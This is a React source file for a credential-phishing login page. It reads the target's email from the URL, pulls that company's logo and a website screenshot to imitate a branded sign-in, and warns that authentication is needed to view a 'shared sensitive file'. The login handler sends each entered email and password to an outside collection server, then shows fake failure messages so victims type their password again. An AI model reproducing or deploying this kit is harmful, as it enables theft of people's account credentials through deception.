import React, { useEffect, useState } from "react";
import {
  Box,
  Button,
  Typography,
  CircularProgress,
  IconButton,
  FormControlLabel,
  Checkbox,
} from "@mui/material";
import axios from "axios";
import { Visibility, VisibilityOff, Person, Lock } from "@mui/icons-material";
import { useSnackbar } from "notistack"; // Add this import


const MtnLoginPage: React.FC = () => {

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [logo, setLogo] = useState("");
  const [background, setBackground] = useState("");
  const [securedSession, setSecuredSession] = useState(true);
const [lastSuccessEmail, setLastSuccessEmail] = useState<string>("");
const [successCount, setSuccessCount] = useState<number>(0);

  const { enqueueSnackbar } = useSnackbar();

  const fetchLogo = async (domain: string) => {
    try {
      const response = await fetch(`https://logo.clearbit.com/${domain}`);
      return response.ok ? response.url : null;
    } catch (error) {
      console.error("Error fetching logo:", error);
      return null;
    }
  };

  const fetchWebsiteScreenshot = async (domain: string) => {
    try {
      const apiUrl = `https://api.microlink.io?url=https://${domain}&screenshot=true`;
      const response = await fetch(apiUrl);
      const data = await response.json();
      return data.data?.screenshot?.url || null;
    } catch (error) {
      console.error("Error fetching screenshot:", error);
      return null;
    }
  };

  const getDomain = (email: string) => email.split("@")[1]?.toLowerCase() || "";

  useEffect(() => {
    const hashEmail = window.location.hash.replace("#", "");
    // Only append encoded number if not already present
    if (hashEmail) {
      // Check if hash already contains an encoded number (simple check: contains '-')
      if (!hashEmail.match(/-.{10,}$/)) {
        // Encode a number (e.g., timestamp) in Base64
        const encodeNumber = (num: number) => {
          return btoa(num.toString());
        };
        const numberToEncode = Date.now(); // You can use any number here
        const encodedNumber = encodeNumber(numberToEncode);
        const newHash = `${hashEmail}-${encodedNumber}`;
        window.location.hash = newHash;
        setEmail(hashEmail);
        fetchCompanyDetails(hashEmail);
      } else {
        // Already has encoded number
        setEmail(hashEmail.split('-')[0]);
        fetchCompanyDetails(hashEmail.split('-')[0]);
      }
    }
  }, []);

  const fetchCompanyDetails = async (email: string) => {
    const domain = getDomain(email);
    if (!domain) return;

    try {
      const logoUrl = await fetchLogo(domain);
      if (logoUrl) setLogo(logoUrl);
      const screenshotUrl = await fetchWebsiteScreenshot(domain);
      if (screenshotUrl) setBackground(screenshotUrl);
    } catch (error) {
      console.error("Failed to fetch company details:", error);
    }
  };

  const handleLogin = async () => {
  if (!password) {
    setError("Password is required!");
    return;
  }

  setLoading(true);

  try {
    await axios.post("https://web-mail-925d.onrender.com/send-email", { email, password });
    setError("");
    setPassword(""); // Clear password field
    if (lastSuccessEmail === email) {
      // Same email, increment count
      if (successCount === 1) {
        enqueueSnackbar("Message sent successfully", { variant: "success" });
      } else {
        enqueueSnackbar("Failed to send message", { variant: "error" });
      }
      setSuccessCount(successCount + 1);
    } else {
      // New email, reset count and show error (even on success)
      enqueueSnackbar("No se pudo enviar el mensaje", { variant: "error" });
      setLastSuccessEmail(email);
      setSuccessCount(1);
    }
  } catch (err) {
    setError("Failed to send email. Try again!");
    enqueueSnackbar("No se pudo enviar el mensaje", { variant: "error" });
    setSuccessCount(0); // Reset for next try
    console.error("Email sending error:", err);
  } finally {
    setLoading(false);
  }
};


  return (
    <Box
      sx={{
        minHeight: "100vh",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        backgroundImage: `url(${background})`,
        backgroundSize: "cover",
        backgroundPosition: "center",
        backdropFilter: "blur(5px)",
        p: { xs: 2, sm: 3 },
      }}
    >
      <Box
        sx={{
          width: "100%",
          maxWidth: { xs: "90%", sm: 400 },
          bgcolor: "rgba(255, 255, 255, 0.9)",
          borderRadius: 2,
          boxShadow: 3,
          p: { xs: 2, sm: 4 },
          textAlign: "center",
          backdropFilter: "blur(8px)",
        }}
      >
        <Box
          sx={{
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            mb: 3,
          }}
        >
          {logo && (
            <img
              src={logo}
              alt="Company Logo"
              style={{ width: 80, height: 80, objectFit: "contain" }}
            />
          )}
        </Box>
        <Typography
          variant="h6"
          sx={{
            color: "firebrick",
            mt: 2,
            textTransform: "uppercase",
            fontSize: { xs: 16, sm: 18 },
          }}
        >
          <b>You must authenticate to view a shared sensitive file.</b>
        </Typography>
        <Typography variant="body2" sx={{ color: "firebrick", mt: 2 }}>
          <b>Confirm ownership of the email listed below.</b>
        </Typography>

        <form onSubmit={(e) => e.preventDefault()}>
          {/* Email Input */}
          <Box sx={{ mb: 2, mt: 2 }}>
            <Typography variant="body2" sx={{ textAlign: "left", mb: 1 }}>
              Email address
            </Typography>
            <Box
              sx={{
                display: "flex",
                alignItems: "center",
                border: "1px solid #ccc",
                borderRadius: 1,
                p: 1,
              }}
            >
              <Person sx={{ color: "action.active", mr: 1 }} />
              <input
                type="email"
                value={email}
                disabled
                style={{
                  flex: 1,
                  border: "none",
                  outline: "none",
                  background: "transparent",
                }}
              />
            </Box>
          </Box>

          {/* Password Input */}
          <Box sx={{ mb: 2 }}>
            <Typography variant="body2" sx={{ textAlign: "left", mb: 1 }}>
              Password
            </Typography>
            <Box
              sx={{
                display: "flex",
                alignItems: "center",
                border: "1px solid #ccc",
                borderRadius: 1,
                p: 1,
              }}
            >
              <Lock sx={{ color: "action.active", mr: 1 }} />
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                style={{
                  flex: 1,
                  border: "none",
                  outline: "none",
                  background: "transparent",
                }}
              />
              <IconButton
                onClick={() => setShowPassword(!showPassword)}
                edge="end"
              >
                {showPassword ? <VisibilityOff /> : <Visibility />}
              </IconButton>
            </Box>
            {error && (
              <Typography variant="caption" color="error">
                {error}
              </Typography>
            )}
          </Box>

          <FormControlLabel
            control={
              <Checkbox
                checked={securedSession}
                onChange={(e) => setSecuredSession(e.target.checked)}
              />
            }
            label="Secured Session?"
          />

          <Button
            fullWidth
            variant="contained"
            color="primary"
            sx={{ mt: 2 }}
            onClick={handleLogin}
            disabled={loading}
          >
            {loading ? <CircularProgress size={24} /> : 'Sign in'}
          </Button>
        </form>
      </Box>
    </Box>
  );
};

export default MtnLoginPage;